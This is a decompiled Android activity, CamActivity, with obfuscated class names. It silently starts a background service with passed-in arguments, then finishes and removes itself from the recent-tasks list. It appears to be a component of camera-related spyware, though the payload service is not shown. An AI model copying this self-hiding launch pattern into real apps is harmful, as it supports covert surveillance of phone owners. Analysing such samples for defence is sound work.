package com.appser;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;

public class CamActivity extends Activity {
    private final BroadcastReceiver abcd = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            CamActivity.this.finish();
        }
    };
    Boolean isRejesterd = false;

    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        try {
            if (this.isRejesterd.booleanValue()) {
                this.isRejesterd = false;
                unregisterReceiver(this.abcd);
            }
        } catch (Exception | IllegalArgumentException unused) {
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        try {
            String[] stringArrayExtra = getIntent().getStringArrayExtra("key");
            if (stringArrayExtra != null) {
                Context applicationContext = getApplicationContext();
                if (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.class, applicationContext)) {
                    registerReceiver(this.abcd, new IntentFilter("xyz"));
                    this.isRejesterd = true;
                    Intent intent = new Intent(applicationContext, futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.class);
                    intent.putExtra(considerablesjoinednintensivenestateadocumentedlcourageqcriminalhnasdaqjcarryingbreservationsl9.FTX1, stringArrayExtra);
                    applicationContext.startService(intent);
                }
            }
        } catch (Exception unused) {
        }
        finish();
    }
}
